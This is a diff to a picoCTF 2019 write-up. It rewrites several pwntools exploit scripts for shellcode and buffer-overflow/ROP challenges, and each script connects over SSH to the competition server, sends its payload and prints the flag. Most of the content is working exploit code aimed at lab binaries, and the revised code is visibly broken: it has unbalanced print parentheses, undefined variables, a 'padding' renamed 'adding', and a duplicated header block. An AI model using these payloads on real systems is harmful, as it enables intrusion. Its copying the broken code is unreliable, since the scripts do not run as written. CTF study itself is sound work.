@@ -24,28 +24,98 @@
 
 ~~~python
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 from pwn import *
 
-context.clear(os='linux', arch='i386')
+#=========================================================
+#                   SETTING UP VARIABLES
+#=========================================================
+
+os ='linux'
+arch ='i386'    
+r_host = '2019shell1.picoctf.com'
+r_dir = '/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6'
+r_user = 'User'
+r_passwd = 'Pa$$w0rd'
+# r_port = ''                                            
+exe = './vuln'
+argv = sys.argv
+gdbscript = 'b* main'
+s = ''
+io = ''
+begin = ''
+end = ''
+data = ''
+
+                  # Context variables # 
+
 context.log_level = 'info'
+context.update(os=os, arch=arch)
 
-s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')
+#==========================================================
+#                   FUNCTION DEFINITIONS
+#==========================================================
 
-io = s.process('vuln',cwd='/problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6')
+def attach_gdb():
+        gdb.attach(io, gdbscript=gdbscript)
+
+def start(argv=[], *a, **kw):
+    global begin
+    global exe
+    global io
+    global s
+    begin = time.time()
+    if gdb:
+      io = process(elf.path)
+      context.update(log_level = 'debug')
+      attach_gdb()
+      log.info('Setting log level to %s', str(context.log_level))
+      log.info('Attaching gdb to running process')
+      log.info('gdb script = %s', str(gdbscript))
+      log.info('Starting debug exploit...')
+
+    elif remote:
+      context.update(log_level = 'error')
+      s = ssh(host=r_host, user=r_user, password=r_passwd)
+      io = s.process(elf, cwd=r_dir)
+      log.info('Remote variables set:')
+      log.info('Remote host = ', str(r_host))
+      log.info('Remote user = ', str(r_user))
+      log.info('Changing working directory to: ', str(r_dir))
+      log.info('Starting remote exploit...')
+
+    else:
+      io = process(elf.path)
+      log.info('Starting local exploit ...')
+
+def finish():
+  global end
+  global begin
+  end = time.time()
+  print('Time elapsed: ', end - begin)
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+start()
 
 shellcode = asm(shellcraft.sh())
 
 payload = shellcode
 
-print io.recv()
+print(repr(io.recv())
 io.sendline(payload)
 
-print io.recv()
+print(repr(io.recv())
 io.sendline('cat flag.txt')
 
-print io.recv()
+print(repr(io.recv())
 
+finish()
+#===========================================================
+#                       END OF SCRIPT                      
+#===========================================================
 ~~~
 
 **Flag:** *picoCTF{h4ndY_d4ndY_sh311c0d3_707f1a87}*
@@ -68,28 +138,99 @@ print io.recv()
 
 ~~~python
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 from pwn import *
 
-context.clear(os='linux', arch='i386')
+#=========================================================
+#                   SETTING UP VARIABLES
+#=========================================================
+
+os ='linux'
+arch ='i386'    
+r_host = '2019shell1.picoctf.com'
+r_dir = '/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1'
+r_user = 'User'
+r_passwd = 'Pa$$w0rd'
+# r_port = ''                                            
+exe = './vuln'
+argv = sys.argv
+gdbscript = 'b* main'
+s = ''
+io = ''
+begin = ''
+end = ''
+data = ''
+
+                  # Context variables # 
+
 context.log_level = 'info'
+context.update(os=os, arch=arch)
 
-s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')
+#==========================================================
+#                   FUNCTION DEFINITIONS
+#==========================================================
 
-io = s.process('vuln',cwd='/problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1')
+def attach_gdb():
+        gdb.attach(io, gdbscript=gdbscript)
+
+def start(argv=[], *a, **kw):
+    global begin
+    global exe
+    global io
+    global s
+    begin = time.time()
+    if gdb:
+      io = process(elf.path)
+      context.update(log_level = 'debug')
+      attach_gdb()
+      log.info('Setting log level to %s', str(context.log_level))
+      log.info('Attaching gdb to running process')
+      log.info('gdb script = %s', str(gdbscript))
+      log.info('Starting debug exploit...')
+
+    elif remote:
+      context.update(log_level = 'error')
+      s = ssh(host=r_host, user=r_user, password=r_passwd)
+      io = s.process(elf, cwd=r_dir)
+      log.info('Remote variables set:')
+      log.info('Remote host = ', str(r_host))
+      log.info('Remote user = ', str(r_user))
+      log.info('Changing working directory to: ', str(r_dir))
+      log.info('Starting remote exploit...')
+
+    else:
+      io = process(elf.path)
+      log.info('Starting local exploit ...')
+
+def finish():
+  global end
+  global begin
+  end = time.time()
+  print('Time elapsed: ', end - begin)
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+start()
 
 padding = '\x90' * 256
 shellcode = asm(shellcraft.sh())
 
 payload = padding + shellcode
 
-print io.recv()
+print(repr(io.recv())
 io.sendline(payload)
 
-print io.recv()
+print(repr(io.recv())
 io.sendline('cat flag.txt')
 
-print io.recv()
+print(repr(io.recv())
+
+finish()
+#===========================================================
+#                       END OF SCRIPT                      
+#===========================================================
 ~~~
 
 **Flag:** *picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}*
@@ -142,15 +283,81 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
 
 ~~~python
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 from pwn import *
 
-context.clear(os='linux', arch='i386')
+#=========================================================
+#                   SETTING UP VARIABLES
+#=========================================================
+
+os ='linux'
+arch ='i386'    
+r_host = '2019shell1.picoctf.com'
+r_dir = '/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de'
+r_user = 'User'
+r_passwd = 'Pa$$w0rd'
+# r_port = ''                                            
+exe = './vuln'
+argv = sys.argv
+gdbscript = 'b* main'
+s = ''
+io = ''
+begin = ''
+end = ''
+data = ''
+
+                  # Context variables # 
+
 context.log_level = 'info'
+context.update(os=os, arch=arch)
 
-s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')
+#==========================================================
+#                   FUNCTION DEFINITIONS
+#==========================================================
 
-io = s.process('vuln',cwd='/problems/overflow-1_6_0a7153ff536ac8779749bc2dfa4735de')
+def attach_gdb():
+        gdb.attach(io, gdbscript=gdbscript)
+
+def start(argv=[], *a, **kw):
+    global begin
+    global exe
+    global io
+    global s
+    begin = time.time()
+    if gdb:
+      io = process(elf.path)
+      context.update(log_level = 'debug')
+      attach_gdb()
+      log.info('Setting log level to %s', str(context.log_level))
+      log.info('Attaching gdb to running process')
+      log.info('gdb script = %s', str(gdbscript))
+      log.info('Starting debug exploit...')
+
+    elif remote:
+      context.update(log_level = 'error')
+      s = ssh(host=r_host, user=r_user, password=r_passwd)
+      io = s.process(elf, cwd=r_dir)
+      log.info('Remote variables set:')
+      log.info('Remote host = ', str(r_host))
+      log.info('Remote user = ', str(r_user))
+      log.info('Changing working directory to: ', str(r_dir))
+      log.info('Starting remote exploit...')
+
+    else:
+      io = process(elf.path)
+      log.info('Starting local exploit ...')
+
+def finish():
+  global end
+  global begin
+  end = time.time()
+  print('Time elapsed: ', end - begin)
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+start()
 
 padding = cyclic(cyclic_find('taaa'))
 flag = p32(0x080485e6)
@@ -158,10 +365,15 @@ flag = p32(0x080485e6)
 payload = padding 
 payload += flag
 
-print io.recv()
+print(repr(io.recv())
 io.sendline(payload)
 
-print io.recv()
+print(repr(io.recv())
+
+finish()
+#===========================================================
+#                       END OF SCRIPT                      
+#===========================================================
 ~~~
 
 **Flag:** *picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}*
@@ -194,20 +406,83 @@ print io.recv()
 
 ~~~python
 #!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 from pwn import *
 
-# elf = context.binary = ELF('vuln')
-context.update(os='linux', arch='i386')
+#=========================================================
+#                   SETTING UP VARIABLES
+#=========================================================
+
+os ='linux'
+arch ='i386'    
+r_host = '2019shell1.picoctf.com'
+r_dir = '/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446'
+r_user = 'User'
+r_passwd = 'Pa$$w0rd'
+# r_port = ''                                            
+exe = './vuln'
+argv = sys.argv
+gdbscript = 'b* main'
+s = ''
+io = ''
+begin = ''
+end = ''
+data = ''
+
+                  # Context variables # 
+
 context.log_level = 'info'
+context.update(os=os, arch=arch)
 
-s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')
+#==========================================================
+#                   FUNCTION DEFINITIONS
+#==========================================================
 
-io = s.process('vuln',cwd='/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446')
+def attach_gdb():
+        gdb.attach(io, gdbscript=gdbscript)
 
-# io = process(elf.path)
+def start(argv=[], *a, **kw):
+    global begin
+    global exe
+    global io
+    global s
+    begin = time.time()
+    if gdb:
+      io = process(elf.path)
+      context.update(log_level = 'debug')
+      attach_gdb()
+      log.info('Setting log level to %s', str(context.log_level))
+      log.info('Attaching gdb to running process')
+      log.info('gdb script = %s', str(gdbscript))
+      log.info('Starting debug exploit...')
 
-padding = cyclic(cyclic_find('waab'))          # location of pattern match @ eip
+    elif remote:
+      context.update(log_level = 'error')
+      s = ssh(host=r_host, user=r_user, password=r_passwd)
+      io = s.process(elf, cwd=r_dir)
+      log.info('Remote variables set:')
+      log.info('Remote host = ', str(r_host))
+      log.info('Remote user = ', str(r_user))
+      log.info('Changing working directory to: ', str(r_dir))
+      log.info('Starting remote exploit...')
+
+    else:
+      io = process(elf.path)
+      log.info('Starting local exploit ...')
+
+def finish():
+  global end
+  global begin
+  end = time.time()
+  print('Time elapsed: ', end - begin)
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+start()
+
+adding = cyclic(cyclic_find('waab'))           # location of pattern match @ eip
 argu1 = p32(0xdeadbeef)                        # first argurment to pass to flag function
 argu2 = p32(0xc0ded00d)                        # second argument to pass to flag function
 rop = p32(0x0804878a)                          # pop edi; pop ebp; ret;
@@ -219,12 +494,14 @@ payload += rop
 payload += argu1
 payload += argu2
 
-
-# gdb.attach(io, gdbscript = 'b* main')
-
-print io.recv()
+print(repr(io.recv())
 io.sendline(payload)
-print io.recv()
+print(repr(io.recv())
+
+finish()
+#===========================================================
+#                       END OF SCRIPT                      
+#===========================================================
 ~~~
 
 **Flag:** *picoCTF{arg5_and_r3turn51b106031}*
@@ -244,19 +521,86 @@ print io.recv()
 >> when running the exploit, the stack my be misaligned. In order to fix this I added the address of a return
 >> ROP gadget. Calling `main` before the flag function also re-aligns the stack.
 ~~~python
-#!/usr/bin/python
+#!/usr/bin/env python
 
 from pwn import *
 
-# elf = context.binary = ELF('vuln')
-context.update(os='linux', arch='amd64')
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+
+#=========================================================
+#                   SETTING UP VARIABLES
+#=========================================================
+
+os ='linux'
+arch ='AMD64'    
+r_host = '2019shell1.picoctf.com'
+r_dir = '/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123'
+r_user = 'User'
+r_passwd = 'Pa$$w0rd'
+# r_port = ''                                            
+exe = './vuln'
+argv = sys.argv
+gdbscript = 'b* main'
+s = ''
+io = ''
+begin = ''
+end = ''
+data = ''
+
+                  # Context variables # 
+
 context.log_level = 'info'
+context.update(os=os, arch=arch)
 
-s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$word')
+#==========================================================
+#                   FUNCTION DEFINITIONS
+#==========================================================
 
-io = s.process('vuln',cwd='/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123')
+def attach_gdb():
+        gdb.attach(io, gdbscript=gdbscript)
 
-# io = process(elf.path)
+def start(argv=[], *a, **kw):
+    global begin
+    global exe
+    global io
+    global s
+    begin = time.time()
+    if gdb:
+      io = process(elf.path)
+      context.update(log_level = 'debug')
+      attach_gdb()
+      log.info('Setting log level to %s', str(context.log_level))
+      log.info('Attaching gdb to running process')
+      log.info('gdb script = %s', str(gdbscript))
+      log.info('Starting debug exploit...')
+
+    elif remote:
+      context.update(log_level = 'error')
+      s = ssh(host=r_host, user=r_user, password=r_passwd)
+      io = s.process(elf, cwd=r_dir)
+      log.info('Remote variables set:')
+      log.info('Remote host = ', str(r_host))
+      log.info('Remote user = ', str(r_user))
+      log.info('Changing working directory to: ', str(r_dir))
+      log.info('Starting remote exploit...')
+
+    else:
+      io = process(elf.path)
+      log.info('Starting local exploit ...')
+
+def finish():
+  global end
+  global begin
+  end = time.time()
+  print('Time elapsed: ', end - begin)
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+start()
 
 padding = cyclic(cyclic_find('saaa'))          # location of pattern match @ rsp
 rop = p64(0x004008c4)
@@ -266,12 +610,14 @@ payload = padding
 payload += rop
 payload += flag
 
-
-# gdb.attach(io, gdbscript = 'b* main')
-
 io.sendline(payload)
 
-print io.recvall()
+print(repr(io.recvall())
+
+finish()
+#===========================================================
+#                       END OF SCRIPT                      
+#===========================================================
 ~~~
 
 **Flag:** *picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_7a154fef}*
@@ -290,19 +636,82 @@ print io.recvall()
 >> The writer of this problem left the flag function in there, so instead of using a ROP chain to supply the correct arguments,
 >> you can just use the same script as the [New Overflow](#newoverflow) problem.
 ~~~python
-#!/usr/bin/python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
 
 from pwn import *
 
-# elf = context.binary = ELF('vuln')
-context.update(os='linux', arch='amd64')
+#=========================================================
+#                   SETTING UP VARIABLES
+#=========================================================
+
+os ='linux'
+arch ='AMD64'    
+r_host = '2019shell1.picoctf.com'
+r_dir = '/problems/newoverflow-2_2_1428488532921ee33e0ceb92267e30a7'
+r_user = 'User'
+r_passwd = 'Pa$$w0rd'
+# r_port = ''                                            
+exe = './vuln'
+argv = sys.argv
+gdbscript = 'b* main'
+s = ''
+io = ''
+begin = ''
+end = ''
+data = ''
+
+                  # Context variables # 
+
 context.log_level = 'info'
+context.update(os=os, arch=arch)
 
-s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$word')
+#==========================================================
+#                   FUNCTION DEFINITIONS
+#==========================================================
 
-io = s.process('vuln',cwd='/problems/newoverflow-2_2_1428488532921ee33e0ceb92267e30a7')
+def attach_gdb():
+        gdb.attach(io, gdbscript=gdbscript)
 
-# io = process(elf.path)
+def start(argv=[], *a, **kw):
+    global begin
+    global exe
+    global io
+    global s
+    begin = time.time()
+    if gdb:
+      io = process(elf.path)
+      context.update(log_level = 'debug')
+      attach_gdb()
+      log.info('Setting log level to %s', str(context.log_level))
+      log.info('Attaching gdb to running process')
+      log.info('gdb script = %s', str(gdbscript))
+      log.info('Starting debug exploit...')
+
+    elif remote:
+      context.update(log_level = 'error')
+      s = ssh(host=r_host, user=r_user, password=r_passwd)
+      io = s.process(elf, cwd=r_dir)
+      log.info('Remote variables set:')
+      log.info('Remote host = ', str(r_host))
+      log.info('Remote user = ', str(r_user))
+      log.info('Changing working directory to: ', str(r_dir))
+      log.info('Starting remote exploit...')
+
+    else:
+      io = process(elf.path)
+      log.info('Starting local exploit ...')
+
+def finish():
+  global end
+  global begin
+  end = time.time()
+  print('Time elapsed: ', end - begin)
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+start()
 
 padding = cyclic(72)          # location of pattern match @ rsp
 win = p64(0x004009bc)         # location of main function
@@ -312,12 +721,14 @@ payload = padding
 payload += win
 payload += flag
 
-
-# gdb.attach(io, gdbscript = 'b* main')
-
 io.sendline(payload)
 
-print io.recvall()
+print(repr(io.recvall())
+
+finish()
+#===========================================================
+#                       END OF SCRIPT                      
+#===========================================================
 ~~~
 
 **Flag:** *picoCTF{r0p_1t_d0nT_st0p_1t_64362a2b}*
